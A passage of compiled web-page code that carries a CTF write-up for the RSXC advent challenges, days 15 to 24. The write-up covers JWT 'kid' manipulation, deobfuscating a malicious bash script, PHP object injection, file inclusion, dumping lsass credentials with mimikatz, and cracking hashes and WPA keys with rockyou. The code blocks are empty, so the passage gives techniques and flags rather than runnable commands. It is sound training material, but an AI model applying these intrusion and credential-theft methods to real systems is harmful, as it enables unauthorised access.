`),co=t(Ki,"IMG",{src:!0,alt:!0}),Ki.forEach(s),Qr=k(a),ro=t(a,"P",{});var Pw=o(ro);Jm=c(Pw,"Navigating to the page with our new and tampered JWT cookie gives us the flag:"),Pw.forEach(s),Lr=k(a),dn=t(a,"PRE",{class:!0});var Ry=o(dn);Ry.forEach(s),Kr=k(a),mn=t(a,"P",{});var v3=o(mn);jm=c(v3,"The flag is: "),hl=t(v3,"CODE",{});var Hw=o(hl);Pm=c(Hw,"RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}"),Hw.forEach(s),v3.forEach(s),au=k(a),bn=t(a,"H2",{id:!0});var Aw=o(bn);uo=t(Aw,"A",{href:!0});var Xw=o(uo);Hm=c(Xw,"[DAY 15] JWT 2"),Xw.forEach(s),Aw.forEach(s),su=k(a),gn=t(a,"H3",{id:!0});var qw=o(gn);ko=t(qw,"A",{href:!0});var Gw=o(ko);Am=c(Gw,"Challenge"),Gw.forEach(s),qw.forEach(s),nu=k(a),ho=t(a,"BLOCKQUOTE",{});var Bw=o(ho);fo=t(Bw,"P",{});var _3=o(fo);Xm=c(_3,`I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
`),ba=t(_3,"A",{href:!0,rel:!0,class:!0,target:!0});var $w=o(ba);qm=c($w,"http://rsxc.no:20015"),$w.forEach(s),_3.forEach(s),Bw.forEach(s),eu=k(a),vn=t(a,"H3",{id:!0});var Qw=o(vn);mo=t(Qw,"A",{href:!0});var Lw=o(mo);Gm=c(Lw,"Solution"),Lw.forEach(s),Qw.forEach(s),tu=k(a),h=t(a,"P",{});var b=o(h);Bm=c(b,"This challenge seemed to be the same as day 15 but with just "),fl=t(b,"CODE",{});var Kw=o(fl);$m=c(Kw,"kid"),Kw.forEach(s),Qm=c(b,"-issues added. "),dl=t(b,"CODE",{});var a5=o(dl);Lm=c(a5,"kid"),a5.forEach(s),Km=c(b," is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the "),ml=t(b,"CODE",{});var s5=o(ml);a1=c(s5,"kid"),s5.forEach(s),s1=c(b," file path check is used within php functions such as "),bl=t(b,"CODE",{});var n5=o(bl);n1=c(n5,"include"),n5.forEach(s),e1=c(b," or "),gl=t(b,"CODE",{});var e5=o(gl);t1=c(e5,"file_get_content"),e5.forEach(s),o1=c(b," one could also inject the data in, reading the source. After much trial and error using the well known python "),ga=t(b,"A",{href:!0,rel:!0,class:!0,target:!0});var t5=o(ga);p1=c(t5,"jwt_tool"),t5.forEach(s),l1=c(b," for tampering with the token, we find that setting the "),vl=t(b,"CODE",{});var o5=o(vl);i1=c(o5,"kid"),o5.forEach(s),c1=c(b," value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the "),_l=t(b,"CODE",{});var p5=o(_l);r1=c(p5,"kid"),p5.forEach(s),u1=c(b," value to "),wl=t(b,"CODE",{});var l5=o(wl);k1=c(l5,"portal.php"),l5.forEach(s),h1=c(b," (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:"),b.forEach(s),ou=k(a),_n=t(a,"PRE",{class:!0});var Uy=o(_n);Uy.forEach(s),pu=k(a),wn=t(a,"PRE",{class:!0});var Ny=o(wn);Ny.forEach(s),lu=k(a),En=t(a,"P",{});var w3=o(En);f1=c(w3,"The flag is: "),El=t(w3,"CODE",{});var i5=o(El);d1=c(i5,"RSXC{Don't_let_others_decide_where_your_keys_are_located}"),i5.forEach(s),w3.forEach(s),iu=k(a),Tn=t(a,"H2",{id:!0});var c5=o(Tn);bo=t(c5,"A",{href:!0});var r5=o(bo);m1=c(r5,"[DAY 16] A scary command"),r5.forEach(s),c5.forEach(s),cu=k(a),yn=t(a,"H3",{id:!0});var u5=o(yn);go=t(u5,"A",{href:!0});var k5=o(go);b1=c(k5,"Challenge"),k5.forEach(s),u5.forEach(s),ru=k(a),vo=t(a,"BLOCKQUOTE",{});var h5=o(vo);_o=t(h5,"P",{});var E3=o(_o);g1=c(E3,`Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn\u2019t have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
`),va=t(E3,"A",{href:!0,rel:!0,class:!0,target:!0});var f5=o(va);v1=c(f5,"https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),f5.forEach(s),E3.forEach(s),h5.forEach(s),uu=k(a),Vn=t(a,"H3",{id:!0});var d5=o(Vn);wo=t(d5,"A",{href:!0});var m5=o(wo);_1=c(m5,"Solution"),m5.forEach(s),d5.forEach(s),ku=k(a),Ca=t(a,"P",{});var Eh=o(Ca);w1=c(Eh,"Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the "),Tl=t(Eh,"CODE",{});var b5=o(Tl);E1=c(b5,"eval"),b5.forEach(s),T1=c(Eh," commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:"),Eh.forEach(s),hu=k(a),xn=t(a,"PRE",{class:!0});var Wy=o(xn);Wy.forEach(s),fu=k(a),Rn=t(a,"PRE",{class:!0});var Sy=o(Rn);Sy.forEach(s),du=k(a),Da=t(a,"P",{});var Th=o(Da);y1=c(Th,"Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable "),yl=t(Th,"CODE",{});var g5=o(yl);V1=c(g5,"s"),g5.forEach(s),x1=c(Th," seemed to have changed."),Th.forEach(s),mu=k(a),Un=t(a,"PRE",{class:!0});var My=o(Un);My.forEach(s),bu=k(a),Ya=t(a,"P",{});var yh=o(Ya);R1=c(yh,"Further I piped this bash output into a new file "),Vl=t(yh,"CODE",{});var v5=o(Vl);U1=c(v5,"16-challenge2.sh"),v5.forEach(s),N1=c(yh,", adding the neccessary edits and modifications to safely run the code:"),yh.forEach(s),gu=k(a),Nn=t(a,"PRE",{class:!0});var Iy=o(Nn);Iy.forEach(s),vu=k(a),Eo=t(a,"P",{});var _5=o(Eo);W1=c(_5,"Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:"),_5.forEach(s),_u=k(a),Wn=t(a,"PRE",{class:!0});var Oy=o(Wn);Oy.forEach(s),wu=k(a),X=t(a,"P",{});var Tp=o(X);S1=c(Tp,"Looking like we\u2019re nearing the final steps as there is some commands piped into "),xl=t(Tp,"CODE",{});var w5=o(xl);M1=c(w5,"sh"),w5.forEach(s),I1=c(Tp,", I write the output into the final bash file "),Rl=t(Tp,"CODE",{});var E5=o(Rl);O1=c(E5,"16-challenge3.sh"),E5.forEach(s),F1=c(Tp," with some minor changes once again:"),Tp.forEach(s),Eu=k(a),Sn=t(a,"PRE",{class:!0});var Fy=o(Sn);Fy.forEach(s),Tu=k(a),W=t(a,"P",{});var Ga=o(W);z1=c(Ga,"Running this bash script gave a completely different output with a quite large hexadecimal piped into "),Ul=t(Ga,"CODE",{});var T5=o(Ul);C1=c(T5,"xxd"),T5.forEach(s),D1=c(Ga," and then "),Nl=t(Ga,"CODE",{});var y5=o(Nl);Y1=c(y5,"sh"),y5.forEach(s),Z1=c(Ga," for execution. Further running this command directly without executing ("),Wl=t(Ga,"CODE",{});var V5=o(Wl);J1=c(V5,"| sh"),V5.forEach(s),j1=c(Ga,") gives:"),Ga.forEach(s),yu=k(a),Mn=t(a,"PRE",{class:!0});var zy=o(Mn);zy.forEach(s),Vu=k(a),To=t(a,"P",{});var x5=o(To);P1=c(x5,"The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:"),x5.forEach(s),xu=k(a),In=t(a,"PRE",{class:!0});var Cy=o(In);Cy.forEach(s),Ru=k(a),On=t(a,"P",{});var T3=o(On);H1=c(T3,"The flag is: "),Sl=t(T3,"CODE",{});var R5=o(Sl);A1=c(R5,"RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}"),R5.forEach(s),T3.forEach(s),Uu=k(a),Fn=t(a,"H2",{id:!0});var U5=o(Fn);yo=t(U5,"A",{href:!0});var N5=o(yo);X1=c(N5,"[DAY 17] My XMas card"),N5.forEach(s),U5.forEach(s),Nu=k(a),zn=t(a,"H3",{id:!0});var W5=o(zn);Vo=t(W5,"A",{href:!0});var S5=o(Vo);q1=c(S5,"Challenge"),S5.forEach(s),W5.forEach(s),Wu=k(a),xo=t(a,"BLOCKQUOTE",{});var M5=o(xo);Ro=t(M5,"P",{});var y3=o(Ro);G1=c(y3,`We felt like it\u2019s time to start sending out some XMas cards, maybe you find something you like?
`),_a=t(y3,"A",{href:!0,rel:!0,class:!0,target:!0});var I5=o(_a);B1=c(I5,"http://rsxc.no:20017"),I5.forEach(s),y3.forEach(s),M5.forEach(s),Su=k(a),Cn=t(a,"H3",{id:!0});var O5=o(Cn);Uo=t(O5,"A",{href:!0});var F5=o(Uo);$1=c(F5,"Solution"),F5.forEach(s),O5.forEach(s),Mu=k(a),m=t(a,"P",{});var w=o(m);Q1=c(w,"Navigating to the page we are greeted with a Xmas card along with the lines of \u201CFinding your card in /files\u201D. This hint tells us that there exists a directory/path to "),Ml=t(w,"CODE",{});var z5=o(Ml);L1=c(z5,"/files"),z5.forEach(s),K1=c(w,". Going to that said directory, we can see that there are 3 files: "),Il=t(w,"CODE",{});var C5=o(Il);a2=c(C5,"card.txt"),C5.forEach(s),s2=c(w,", "),Ol=t(w,"CODE",{});var D5=o(Ol);n2=c(D5,"index.php-1"),D5.forEach(s),e2=c(w," and "),Fl=t(w,"CODE",{});var Y5=o(Fl);t2=c(Y5,"flag.txt"),Y5.forEach(s),o2=c(w,". Guessing that the flag is in the "),zl=t(w,"CODE",{});var Z5=o(zl);p2=c(Z5,"flag.txt"),Z5.forEach(s),l2=c(w," file, I get a forbidden error on opening it as I don\u2019t have permission to access the resource. Looking at all the other files we see that the content of "),Cl=t(w,"CODE",{});var J5=o(Cl);i2=c(J5,"card.txt"),J5.forEach(s),c2=c(w," is loaded and read at "),Dl=t(w,"CODE",{});var j5=o(Dl);r2=c(j5,"index.php"),j5.forEach(s),u2=c(w,", and the source code could be seen in "),Yl=t(w,"CODE",{});var P5=o(Yl);k2=c(P5,"index.php-1"),P5.forEach(s),h2=c(w,":"),w.forEach(s),Iu=k(a),Dn=t(a,"PRE",{class:!0});var Dy=o(Dn);Dy.forEach(s),Ou=k(a),S=t(a,"P",{});var Ba=o(S);f2=c(Ba,"Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized "),Zl=t(Ba,"CODE",{});var H5=o(Zl);d2=c(H5,"Card"),H5.forEach(s),m2=c(Ba," object to the GET request input, the object is constructed and the method "),Jl=t(Ba,"CODE",{});var A5=o(Jl);b2=c(A5,"displayCard()"),A5.forEach(s),g2=c(Ba," is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of "),jl=t(Ba,"CODE",{});var X5=o(jl);v2=c(X5,"Card"),X5.forEach(s),_2=c(Ba," and then serializing it:"),Ba.forEach(s),Fu=k(a),Yn=t(a,"PRE",{class:!0});var Yy=o(Yn);Yy.forEach(s),zu=k(a),Zn=t(a,"PRE",{class:!0});var Zy=o(Zn);Zy.forEach(s),Cu=k(a),Jn=t(a,"P",{});var V3=o(Jn);w2=c(V3,"The flag is: "),Pl=t(V3,"CODE",{});var q5=o(Pl);E2=c(q5,"RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}"),q5.forEach(s),V3.forEach(s),Du=k(a),jn=t(a,"H2",{id:!0});var G5=o(jn);No=t(G5,"A",{href:!0});var B5=o(No);T2=c(B5,"[DAY 18] Remember the flag? Docker remembers"),B5.forEach(s),G5.forEach(s),Yu=k(a),Pn=t(a,"H3",{id:!0});var $5=o(Pn);Wo=t($5,"A",{href:!0});var Q5=o(Wo);y2=c(Q5,"Challenge"),Q5.forEach(s),$5.forEach(s),Zu=k(a),So=t(a,"BLOCKQUOTE",{});var L5=o(So);Mo=t(L5,"P",{});var x3=o(Mo);V2=c(x3,`We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
`),wa=t(x3,"A",{href:!0,rel:!0,class:!0,target:!0});var K5=o(wa);x2=c(K5,"https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),K5.forEach(s),x3.forEach(s),L5.forEach(s),Ju=k(a),Hn=t(a,"H3",{id:!0});var aE=o(Hn);Io=t(aE,"A",{href:!0});var sE=o(Io);R2=c(sE,"Solution"),sE.forEach(s),aE.forEach(s),ju=k(a),Za=t(a,"P",{});var Vh=o(Za);U2=c(Vh,"We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running "),Hl=t(Vh,"CODE",{});var nE=o(Hl);N2=c(nE,"strings"),nE.forEach(s),W2=c(Vh," and greping for the flag on the uncompressed file gives us the flag in plaintext\u2026 Sometimes, solving a challenge can be as easy as just that."),Vh.forEach(s),Pu=k(a),An=t(a,"PRE",{class:!0});var Jy=o(An);Jy.forEach(s),Hu=k(a),Xn=t(a,"P",{});var R3=o(Xn);S2=c(R3,"The flag is: "),Al=t(R3,"CODE",{});var eE=o(Al);M2=c(eE,"RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}"),eE.forEach(s),R3.forEach(s),Au=k(a),qn=t(a,"H2",{id:!0});var tE=o(qn);Oo=t(tE,"A",{href:!0});var oE=o(Oo);I2=c(oE,"[DAY 19] The inclusive xmas cards"),oE.forEach(s),tE.forEach(s),Xu=k(a),Gn=t(a,"H3",{id:!0});var pE=o(Gn);Fo=t(pE,"A",{href:!0});var lE=o(Fo);O2=c(lE,"Challenge"),lE.forEach(s),pE.forEach(s),qu=k(a),zo=t(a,"BLOCKQUOTE",{});var iE=o(zo);Co=t(iE,"P",{});var U3=o(Co);F2=c(U3,`We felt that the our last xmas cards weren\u2019t that inclusive. So we made even more options, so everyone has one that fits them!
`),Ea=t(U3,"A",{href:!0,rel:!0,class:!0,target:!0});var cE=o(Ea);z2=c(cE,"http://rsxc.no:20019"),cE.forEach(s),U3.forEach(s),iE.forEach(s),Gu=k(a),Bn=t(a,"H3",{id:!0});var rE=o(Bn);Do=t(rE,"A",{href:!0});var uE=o(Do);C2=c(uE,"Solution"),uE.forEach(s),rE.forEach(s),Bu=k(a),g=t(a,"P",{});var x=o(g);D2=c(x,"Similar to the challenge from day 17, we are greeted with a page containing different xmas cards after navigting to the website. However, different from the previous challenge, there is no source code to be found at the directory "),Xl=t(x,"CODE",{});var kE=o(Xl);Y2=c(kE,"/files"),kE.forEach(s),Z2=c(x,". The only text files we could see was "),ql=t(x,"CODE",{});var hE=o(ql);J2=c(hE,"flag.txt"),hE.forEach(s),j2=c(x,", "),Gl=t(x,"CODE",{});var fE=o(Gl);P2=c(fE,"santa.txt"),fE.forEach(s),H2=c(x,", "),Bl=t(x,"CODE",{});var dE=o(Bl);A2=c(dE,"snowmen.txt"),dE.forEach(s),X2=c(x," and "),$l=t(x,"CODE",{});var mE=o($l);q2=c(mE,"tree.txt"),mE.forEach(s),G2=c(x,". Again, we don\u2019t have permission to open "),Ql=t(x,"CODE",{});var bE=o(Ql);B2=c(bE,"flag.txt"),bE.forEach(s),$2=c(x," just as last time."),x.forEach(s),$u=k(a),E=t(a,"P",{});var M=o(E);Q2=c(M,"Testing the application and opening the "),Ll=t(M,"CODE",{});var gE=o(Ll);L2=c(gE,"xmas tree"),gE.forEach(s),K2=c(M," card for instance, we see that we are directed to the url: "),Kl=t(M,"CODE",{});var vE=o(Kl);ab=c(vE,"http://rsxc.no:20019/card.php?card=dHJlZS50eHQ="),vE.forEach(s),sb=c(M,", the same php file "),ai=t(M,"CODE",{});var _E=o(ai);nb=c(_E,"card.php"),_E.forEach(s),eb=c(M," as last time with the GET request of "),si=t(M,"CODE",{});var wE=o(si);tb=c(wE,"?card=dHJlZS50eHQ="),wE.forEach(s),ob=c(M,". This time, the GET requests seems to be something that resembles a base64 encoded string. After trying to decode the base64, I could guess how the challenge could be solved as the encryption is just base64\u2019ing the desired file input at the directory "),ni=t(M,"CODE",{});var EE=o(ni);pb=c(EE,"/files"),EE.forEach(s),lb=c(M,"."),M.forEach(s),Qu=k(a),$n=t(a,"PRE",{class:!0});var jy=o($n);jy.forEach(s),Lu=k(a),q=t(a,"P",{});var yp=o(q);ib=c(yp,"Since we can control the GET request input of "),ei=t(yp,"CODE",{});var TE=o(ei);cb=c(TE,"card"),TE.forEach(s),rb=c(yp,", reading the flag is as easy as requesting for the file "),ti=t(yp,"CODE",{});var yE=o(ti);ub=c(yE,"flag.txt"),yE.forEach(s),kb=c(yp," encoded in base64:"),yp.forEach(s),Ku=k(a),Qn=t(a,"PRE",{class:!0});var Py=o(Qn);Py.forEach(s),ak=k(a),Ln=t(a,"P",{});var N3=o(Ln);hb=c(N3,"The flag is: "),oi=t(N3,"CODE",{});var VE=o(oi);fb=c(VE,"RSXC{It_is_not_smart_to_let_people_include_whatever_they_want}"),VE.forEach(s),N3.forEach(s),sk=k(a),Kn=t(a,"H2",{id:!0});var xE=o(Kn);Yo=t(xE,"A",{href:!0});var RE=o(Yo);db=c(RE,"[DAY 20] Easy mistakes"),RE.forEach(s),xE.forEach(s),nk=k(a),ae=t(a,"H3",{id:!0});var UE=o(ae);Zo=t(UE,"A",{href:!0});var NE=o(Zo);mb=c(NE,"Challenge"),NE.forEach(s),UE.forEach(s),ek=k(a),Jo=t(a,"BLOCKQUOTE",{});var WE=o(Jo);jo=t(WE,"P",{});var W3=o(jo);bb=c(W3,`When programming, it is easy to make simple mistakes, and some of them can have dire consequences.
`),Ta=t(W3,"A",{href:!0,rel:!0,class:!0,target:!0});var SE=o(Ta);gb=c(SE,"http://rsxc.no:20020"),SE.forEach(s),W3.forEach(s),WE.forEach(s),tk=k(a),se=t(a,"H3",{id:!0});var ME=o(se);Po=t(ME,"A",{href:!0});var IE=o(Po);vb=c(IE,"Solution"),IE.forEach(s),ME.forEach(s),ok=k(a),Ho=t(a,"P",{});var OE=o(Ho);_b=c(OE,"Upon navigating to the site we are greeted with the source code of the challenge:"),OE.forEach(s),pk=k(a),ne=t(a,"PRE",{class:!0});var Hy=o(ne);Hy.forEach(s),lk=k(a),T=t(a,"P",{});var I=o(T);wb=c(I,"Looking at the code we can see that the api path takes in two inputs as JSON body requests, "),pi=t(I,"CODE",{});var FE=o(pi);Eb=c(FE,"hmac"),FE.forEach(s),Tb=c(I," and "),li=t(I,"CODE",{});var zE=o(li);yb=c(zE,"host"),zE.forEach(s),Vb=c(I,". Upon receiving the correct body input, it signs the "),ii=t(I,"CODE",{});var CE=o(ii);xb=c(CE,"host"),CE.forEach(s),Rb=c(I," input with a secret using the hashing algorithm "),ci=t(I,"CODE",{});var DE=o(ci);Ub=c(DE,"sha256"),DE.forEach(s),Nb=c(I," and comparing the result with the "),ri=t(I,"CODE",{});var YE=o(ri);Wb=c(YE,"hmac"),YE.forEach(s),Sb=c(I," input. The flag is then outputted if these two values compared are the same. However, what the application did not take into consideration is that we have control over both the unsigned value that is to be signed, and the result of the signed. This means that sending in an empty value/string on both inputs, ie. signing an empty message results in an empty message, would give us the flag:"),I.forEach(s),ik=k(a),ee=t(a,"PRE",{class:!0});var Ay=o(ee);Ay.forEach(s),ck=k(a),te=t(a,"P",{});var S3=o(te);Mb=c(S3,"The flag is: "),ui=t(S3,"CODE",{});var ZE=o(ui);Ib=c(ZE,"RSXC{You_have_to_have_the_right_order_for_arguments!}"),ZE.forEach(s),S3.forEach(s),rk=k(a),oe=t(a,"H2",{id:!0});var JE=o(oe);Ao=t(JE,"A",{href:!0});var jE=o(Ao);Ob=c(jE,"[DAY 21] Nice memories"),jE.forEach(s),JE.forEach(s),uk=k(a),pe=t(a,"H3",{id:!0});var PE=o(pe);Xo=t(PE,"A",{href:!0});var HE=o(Xo);Fb=c(HE,"Challenge"),HE.forEach(s),PE.forEach(s),kk=k(a),qo=t(a,"BLOCKQUOTE",{});var AE=o(qo);Go=t(AE,"P",{});var M3=o(Go);zb=c(M3,`Note: The flag is the clear text password for river-security-xmas user.
On a IR mission we found that the threatactor dumped lsass file.
Can you rock our world and find the flag for us?
`),ya=t(M3,"A",{href:!0,rel:!0,class:!0,target:!0});var XE=o(ya);Cb=c(XE,"https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),XE.forEach(s),M3.forEach(s),AE.forEach(s),hk=k(a),le=t(a,"H3",{id:!0});var qE=o(le);Bo=t(qE,"A",{href:!0});var GE=o(Bo);Db=c(GE,"Solution"),GE.forEach(s),qE.forEach(s),fk=k(a),G=t(a,"P",{});var Vp=o(G);Yb=c(Vp,"We are given a system dump of the lsass file. To make it easier for myself, as this was a Windows dump, I opted to use mimikatz on my Windows PC to dump the passwords from the memory dump file "),ki=t(Vp,"CODE",{});var BE=o(ki);Zb=c(BE,"lsass.DMP"),BE.forEach(s),Jb=c(Vp," instead of my usual linux setup "),hi=t(Vp,"EM",{});var $E=o(hi);jb=c($E,"(this is due to not having an instance of kali linux ready)"),$E.forEach(s),Pb=c(Vp,"."),Vp.forEach(s),dk=k(a),ie=t(a,"PRE",{class:!0});var Xy=o(ie);Xy.forEach(s),mk=k(a),y=t(a,"P",{});var O=o(y);Hb=c(O,"After getting the NTLM hash ("),fi=t(O,"CODE",{});var QE=o(fi);Ab=c(QE,"7801ee9c5762bb027ee224d54cb8f62e"),QE.forEach(s),Xb=c(O,") of the password for the user "),di=t(O,"CODE",{});var LE=o(di);qb=c(LE,"river-security-xmas"),LE.forEach(s),Gb=c(O," through mimikatz. With the hint of "),mi=t(O,"CODE",{});var KE=o(mi);Bb=c(KE,"Can you rock our world and find the flag for us?"),KE.forEach(s),$b=c(O,", hinting to the use of "),bi=t(O,"CODE",{});var a6=o(bi);Qb=c(a6,"rockyou.txt"),a6.forEach(s),Lb=c(O,", I bruteforced the password of this hash using "),gi=t(O,"CODE",{});var s6=o(gi);Kb=c(s6,"john-the-ripper"),s6.forEach(s),a0=c(O," (a password cracking tool running on the CPU):"),O.forEach(s),bk=k(a),ce=t(a,"PRE",{class:!0});var qy=o(ce);qy.forEach(s),gk=k(a),re=t(a,"P",{});var I3=o(re);s0=c(I3,"The flag is: "),vi=t(I3,"CODE",{});var n6=o(vi);n0=c(n6,"alliwantforchristmasisyou"),n6.forEach(s),I3.forEach(s),vk=k(a),ue=t(a,"H2",{id:!0});var e6=o(ue);$o=t(e6,"A",{href:!0});var t6=o($o);e0=c(t6,"[DAY 22] Wireless communication"),t6.forEach(s),e6.forEach(s),_k=k(a),ke=t(a,"H3",{id:!0});var o6=o(ke);Qo=t(o6,"A",{href:!0});var p6=o(Qo);t0=c(p6,"Challenge"),p6.forEach(s),o6.forEach(s),wk=k(a),Lo=t(a,"BLOCKQUOTE",{});var l6=o(Lo);_i=t(l6,"P",{});var i6=o(_i);o0=c(i6,`We tried to find a new way of sending the flag, and this time it is even encrypted! Since we are nice we will even give you a hint. The password starts with S. Can you Rock our world?
https:///rsxc.no/5512383c4c02768617233eefdd4f79efe5dea9d08a850c8414644abf296845cf/22-challenge.cap`),i6.forEach(s),l6.forEach(s),Ek=k(a),he=t(a,"H3",{id:!0});var c6=o(he);Ko=t(c6,"A",{href:!0});var r6=o(Ko);p0=c(r6,"Solution"),r6.forEach(s),c6.forEach(s),Tk=k(a),v=t(a,"P",{});var R=o(v);l0=c(R,"We are given a pcap file containing some WPA network sniffed packet. Along with the hint of "),wi=t(R,"CODE",{});var u6=o(wi);i0=c(u6,'"Can you Rock our world?"'),u6.forEach(s),c0=c(R,", hinting to the usage of "),Ei=t(R,"CODE",{});var k6=o(Ei);r0=c(k6,"rockyou.txt"),k6.forEach(s),u0=c(R,". I guessed we could recover or bruteforce the password starting with an "),Ti=t(R,"CODE",{});var h6=o(Ti);k0=c(h6,"S"),h6.forEach(s),h0=c(R," for this network for us to read the encrypted data. Since I didn\u2019t have any computer with GPU on hand, bruteforcing with a tool running with CPU such as "),yi=t(R,"CODE",{});var f6=o(yi);f0=c(f6,"john-the-ripper"),f6.forEach(s),d0=c(R," or "),Vi=t(R,"CODE",{});var d6=o(Vi);m0=c(d6,"aircrack-nk"),d6.forEach(s),b0=c(R," was the only choice. I chose to go with the latter, "),xi=t(R,"CODE",{});var m6=o(xi);g0=c(m6,"aircrack-ng"),m6.forEach(s),v0=c(R," (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job."),R.forEach(s),yk=k(a),Ja=t(a,"P",{});var xh=o(Ja);_0=c(xh,"In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase "),Ri=t(xh,"CODE",{});var b6=o(Ri);w0=c(b6,"S"),b6.forEach(s),E0=c(xh," through a quick python script:"),xh.forEach(s),Vk=k(a),fe=t(a,"PRE",{class:!0});var Gy=o(fe);Gy.forEach(s),xk=k(a),ap=t(a,"P",{});var g6=o(ap);T0=c(g6,"After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:"),g6.forEach(s),Rk=k(a),de=t(a,"PRE",{class:!0});var By=o(de);By.forEach(s),Uk=k(a),ja=t(a,"P",{});var Rh=o(ja);y0=c(Rh,"The password we retrieved is: "),Ui=t(Rh,"CODE",{});var v6=o(Ui);V0=c(v6,"Santaclaws99"),v6.forEach(s),x0=c(Rh,"."),Rh.forEach(s),Nk=k(a),D=t(a,"P",{});var Ye=o(D);R0=c(Ye,`In order to read the encoded pcap network data in wireshark now, we have to add in the password of the network as the decryption key. This can be done in preferences:
`),Ni=t(Ye,"CODE",{});var _6=o(Ni);U0=c(_6,"Edit > Preferences\u2026 > Protocols > IEEE 802.11 > Decription keys > Edit"),_6.forEach(s),N0=k(Ye),sp=t(Ye,"IMG",{src:!0,alt:!0}),W0=k(Ye),np=t(Ye,"IMG",{src:!0,alt:!0}),Ye.forEach(s),Wk=k(a),me=t(a,"P",{});var O3=o(me);S0=c(O3,`Adding the password, we can now see some TCP packets being sent. The flag is found after following that said TCP packet.
`),ep=t(O3,"IMG",{src:!0,alt:!0}),O3.forEach(s),Sk=k(a),be=t(a,"P",{});var F3=o(be);M0=c(F3,"The flag is: "),Wi=t(F3,"CODE",{});var w6=o(Wi);I0=c(w6,"RSXC{WIFI_is_fun}"),w6.forEach(s),F3.forEach(s),Mk=k(a),ge=t(a,"H2",{id:!0});var E6=o(ge);tp=t(E6,"A",{href:!0});var T6=o(tp);O0=c(T6,"[DAY 23] Locating the location"),T6.forEach(s),E6.forEach(s),Ik=k(a),ve=t(a,"H3",{id:!0});var y6=o(ve);op=t(y6,"A",{href:!0});var V6=o(op);F0=c(V6,"Challenge"),V6.forEach(s),y6.forEach(s),Ok=k(a),pp=t(a,"BLOCKQUOTE",{});var x6=o(pp);lp=t(x6,"P",{});var z3=o(lp);z0=c(z3,`We seem to have lost a file, can you please help us find it?
`),Va=t(z3,"A",{href:!0,rel:!0,class:!0,target:!0});var R6=o(Va);C0=c(R6,"http://rsxc.no:20023"),R6.forEach(s),z3.forEach(s),x6.forEach(s),Fk=k(a),_e=t(a,"H3",{id:!0});var U6=o(_e);ip=t(U6,"A",{href:!0});var N6=o(ip);D0=c(N6,"Solution"),N6.forEach(s),U6.forEach(s),zk=k(a),B=t(a,"P",{});var xp=o(B);Y0=c(xp,"Upon navigating to the site, we are greeted with a text saying that a "),Si=t(xp,"CODE",{});var W6=o(Si);Z0=c(W6,"flag.txt"),W6.forEach(s),J0=c(xp," file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb\u2019s "),Mi=t(xp,"CODE",{});var S6=o(Mi);j0=c(S6,"small.txt"),S6.forEach(s),P0=c(xp," wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for."),xp.forEach(s),Ck=k(a),$=t(a,"P",{});var Rp=o($);H0=c(Rp,"From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn\u2019t run the wordlist as it is, but have to somehow manipulate it by directly searching for the file "),Ii=t(Rp,"CODE",{});var M6=o(Ii);A0=c(M6,"flag.txt"),M6.forEach(s),X0=c(Rp,". This was done by modifying the wordlist a little by appending the path "),Oi=t(Rp,"CODE",{});var I6=o(Oi);q0=c(I6,"/flag.txt"),I6.forEach(s),G0=c(Rp," to every line in the wordlist. A quick python script for this can be seen here:"),Rp.forEach(s),Dk=k(a),we=t(a,"PRE",{class:!0});var $y=o(we);$y.forEach(s),Yk=k(a),Pa=t(a,"P",{});var Uh=o(Pa);B0=c(Uh,"Running "),Fi=t(Uh,"CODE",{});var O6=o(Fi);$0=c(O6,"gobuster"),O6.forEach(s),Q0=c(Uh,", a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:"),Uh.forEach(s),Zk=k(a),Ee=t(a,"PRE",{class:!0});var Qy=o(Ee);Qy.forEach(s),Jk=k(a),Te=t(a,"P",{});var C3=o(Te);L0=c(C3,"The flag is: "),zi=t(C3,"CODE",{});var F6=o(zi);K0=c(F6,"RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}"),F6.forEach(s),C3.forEach(s),jk=k(a),ye=t(a,"H2",{id:!0});var z6=o(ye);cp=t(z6,"A",{href:!0});var C6=o(cp);ag=c(C6,"[DAY 24] The watcher"),C6.forEach(s),z6.forEach(s),Pk=k(a),Ve=t(a,"H3",{id:!0});var D6=o(Ve);rp=t(D6,"A",{href:!0});var 